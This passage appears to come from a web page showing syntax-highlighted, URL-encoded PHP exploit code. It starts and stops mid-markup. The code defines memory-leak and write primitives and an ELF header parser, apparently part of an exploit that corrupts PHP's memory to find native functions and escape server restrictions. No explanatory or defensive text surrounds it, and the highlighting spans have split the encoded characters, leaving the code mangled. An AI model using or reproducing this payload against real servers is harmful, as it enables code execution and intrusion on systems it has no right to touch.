class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>write(<span class="hljs-variable">%26</span><span class="hljs-variable">%24</span>str<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>v<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>n<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>n<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>str<span class="hljs-variable">%5</span>b<span class="hljs-variable">%24</span>p<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%5</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>sprintf(<span class="hljs-variable">%22</span><span class="hljs-variable">%25</span><span class="hljs-keyword">c</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span>(<span class="hljs-variable">%24</span>v<span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%200</span>xff))<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>v<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>s<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-keyword">global</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>helper<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">68</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p<span class="hljs-variable">%20</span>-<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>strlen(<span class="hljs-variable">%24</span>helper-<span class="hljs-variable">%3</span>ea)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>s<span class="hljs-variable">%20</span>!<span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%202</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span>s<span class="hljs-variable">%20</span>*<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span>-<span class="hljs-variable">%201</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>parse_elf(<span class="hljs-variable">%24</span>base)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_type<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%202</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phoff<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phentsize<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">36</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%202</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phnum<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">38</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%202</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phnum<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>header<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phoff<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span>*<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phentsize<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_type<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>header<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%204</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_flags<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>header<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%204</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%204</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_vaddr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>header<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_memsz<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>header<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">28</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>p_type<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%201</span><span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_flags<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%206</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_type<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%202</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_vaddr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_vaddr<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_size<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_memsz<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span>else<span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>p_type<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%201</span><span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_flags<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%205</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>text_size<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_memsz<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>!<span class="hljs-variable">%24</span>text_size<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>!<span class="hljs-variable">%24</span>data_size)<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-keyword">false</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>text_size<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_size<span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>get_basic_funcs(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>elf)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>list(<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>text_size<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_size)<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>elf<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_size<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span>*<span class="hljs-variable">%208</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%200</span><span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>deref<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>leak)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span 